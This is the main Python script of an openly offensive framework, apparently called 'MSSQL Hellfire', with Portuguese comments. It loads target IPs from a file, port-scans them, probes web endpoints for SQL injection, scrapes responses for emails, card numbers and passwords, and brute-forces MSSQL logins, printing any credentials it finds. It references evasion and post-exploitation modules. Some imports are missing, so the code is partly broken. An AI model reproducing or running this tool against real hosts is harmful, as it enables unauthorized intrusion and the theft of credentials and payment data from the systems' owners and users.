# main.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# [Lek Do BlacK] - MSSQL HELLFIRE FRAMEWORK - MAIN SCRIPT

import sys
import os
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.scanner import AdvancedScanner
from core.mssql_exploit import MSSQLExploiter
from core.brute_force import MSSQLBruteForcer
from core.post_exploit import PostExploitation
from modules.web.endpoints import EndpointDiscoverer
from modules.web.sqli import SQLInjector
from lib.reporting import ReportGenerator
from lib.evasion import EvasionTechniques
from config.settings import Config

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class MSSQLHellfireFramework:
    def __init__(self):
        self.print_banner()
        self.config = Config()
        self.scanner = AdvancedScanner()
        self.exploiter = MSSQLExploiter()
        self.brute_forcer = MSSQLBruteForcer()
        self.post_exploit = PostExploitation()
        self.endpoint_discoverer = EndpointDiscoverer()
        self.sqli_tester = SQLInjector()
        self.reporter = ReportGenerator()
        self.evasion = EvasionTechniques()
        
        self.results = {
            'targets': {},
            'statistics': {
                'total_ips': 0,
                'total_ports': 0,
                'total_vulnerabilities': 0,
                'total_credentials': 0,
                'total_sensitive_data': 0
            }
        }

    def print_banner(self):
        """Banner vermelho do caralho com contatos"""
        print(f"""{Color.RED}{Color.BOLD}
  _            _      _____           ____   _               _    
 | |          | |    |  __ \         |  _ \ | |             | |   
 | |      ___ | | __ | |  | |  ___   | |_) || |  __ _   ___ | | __
 | |     / _ \| |/ / | |  | | / _ \  |  _ < | | / _` | / __|| |/ /
 | |____|  __/|   <  | |__| || (_) | | |_) || || (_| || (__ |   < 
 |______|\___||_|\_\ |_____/  \___/  |____/ |_| \__,_| \___||_|\_\
{Color.END}""")
        
        print(f"""{Color.BLUE}{Color.BOLD}
============================================================
☞ MSSQL HELLFIRE FRAMEWORK v12.0
☞ By: Lek Do BlacK
============================================================
{Color.END}""")
        
        print(f"{Color.RED}{Color.BOLD}[+] Iniciando MSSQL Nuclear Framework...{Color.END}\n")

    def load_targets(self):
        """Carrega alvos do arquivo ips.txt"""
        try:
            with open('ips.txt', 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            return targets
        except FileNotFoundError:
            print(f"{Color.RED}[!] Arquivo ips.txt não encontrado!{Color.END}")
            return []

    def extract_sensitive_data(self, text):
        """Extrai dados sensíveis do texto"""
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text)
        cards = re.findall(r'\b(?:\d{4}[- ]?){3}\d{4}\b', text)
        users = re.findall(r'(?i)(user|username|login)[=:]\s*([^\s&]+)', text)
        passwords = re.findall(r'(?i)(pass|password|senha)[=:]\s*([^\s&]+)', text)
        
        return emails, cards, users, passwords

    def scan_single_target(self, target):
        """Escaneia um único alvo - VERSÃO CORRIGIDA"""
        print(f"{Color.BLUE}[+] Escaneando: {target}{Color.END}")
        
        results = {
            'target': target,
            'open_ports': [],
            'endpoints': [],
            'vulnerabilities': [],
            'credentials': [],
            'sensitive_data': {
                'emails': [], 'cards': [], 'users': [], 'passwords': []
            }
        }

        # 1. Varredura de portas
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                       993, 995, 1433, 1434, 3306, 3389, 5432, 5900, 8080, 8443, 8888]
        
        results['open_ports'] = self.scanner.advanced_port_scan(target, common_ports)
        
        # 2. Para cada porta HTTP/HTTPS, testa endpoints
        for port, service in results['open_ports']:
            if service in ['HTTP', 'HTTPS', 'HTTP-Alt']:
                protocol = 'https' if port in [443, 8443] else 'http'
                base_url = f"{protocol}://{target}:{port}"
                
                # Descobre endpoints
                endpoints = self.endpoint_discoverer.discover_endpoints(base_url)
                results['endpoints'].extend(endpoints)
                
                # Testa vulnerabilidades web em cada endpoint
                for endpoint, status_code in endpoints:
                    vulns = self.sqli_tester.scan_sql_injection(endpoint)
                    results['vulnerabilities'].extend(vulns)
                    
                    # Extrai dados sensíveis
                    try:
                        response = requests.get(endpoint, timeout=5, verify=False)
                        emails, cards, users, passwords = self.extract_sensitive_data(response.text)
                        results['sensitive_data']['emails'].extend(emails)
                        results['sensitive_data']['cards'].extend(cards)
                        results['sensitive_data']['users'].extend(users)
                        results['sensitive_data']['passwords'].extend(passwords)
                    except:
                        pass

        # 3. Brute force MSSQL se a porta estiver aberta
        if any(port == 1433 for port, service in results['open_ports']):
            try:
                creds = self.brute_forcer.brute_force_mssql(target, 1433)
                results['credentials'] = creds
                for cred in creds:
                    print(f"{Color.GREEN}[+] CREDENCIAL MSSQL: {cred['user']}:{cred['password']}{Color.END}")
            except Exception as e:
                print(f"{Color.RED}[!] Erro no brute force MSSQL: {str(e)}{Color.END}")

        return results

    def run(self):
        """Executa o framework completo - VERSÃO CORRIGIDA"""
        self.print_banner()
        
        targets = self.load_targets()
        if not targets:
            print(f"{Color.RED}[!] Nenhum alvo encontrado para scan!{Color.END}")
            return
        
        print(f"{Color.GREEN}[+] Encontrados {len(targets)} alvos para scan{Color.END}")
        
        # Escaneia cada alvo
        all_results = {}
        for target in targets:
            try:
                results = self.scan_single_target(target)
                all_results[target] = results
                
                # Atualiza estatísticas
                self.results['statistics']['total_ips'] += 1
                self.results['statistics']['total_ports'] += len(results['open_ports'])
                self.results['statistics']['total_vulnerabilities'] += len(results['vulnerabilities'])
                self.results['statistics']['total_credentials'] += len(results['credentials'])
                
                # Delay entre alvos
                time.sleep(1)
                
            except Exception as e:
                print(f"{Color.RED}[!] Erro no alvo {target}: {str(e)}{Color.END}")
                continue
        
        # Gera relatório final
        if all_results:
            report_file = self.reporter.generate_report(all_results)
            print(f"{Color.GREEN}[+] Relatório gerado: {report_file}{Color.END}")
        
        # Mostra resumo
        self.show_summary()

    def show_summary(self):
        """Mostra resumo da operação"""
        stats = self.results['statistics']
        print(f"\n{Color.RED}{'='*60}{Color.END}")
        print(f"{Color.RED}{Color.BOLD}           RESUMO DA OPERAÇÃO{Color.END}")
        print(f"{Color.RED}{'='*60}{Color.END}")
        print(f"{Color.GREEN}Total de IPs: {stats['total_ips']}{Color.END}")
        print(f"{Color.GREEN}Total de Portas: {stats['total_ports']}{Color.END}")
        print(f"{Color.GREEN}Total de Vulnerabilidades: {stats['total_vulnerabilities']}{Color.END}")
        print(f"{Color.GREEN}Total de Credenciais: {stats['total_credentials']}{Color.END}")
        print(f"{Color.GREEN}Total de Dados Sensíveis: {stats['total_sensitive_data']}{Color.END}")
        print(f"{Color.RED}{'='*60}{Color.END}")

if __name__ == "__main__":
    framework = MSSQLHellfireFramework()
    framework.run()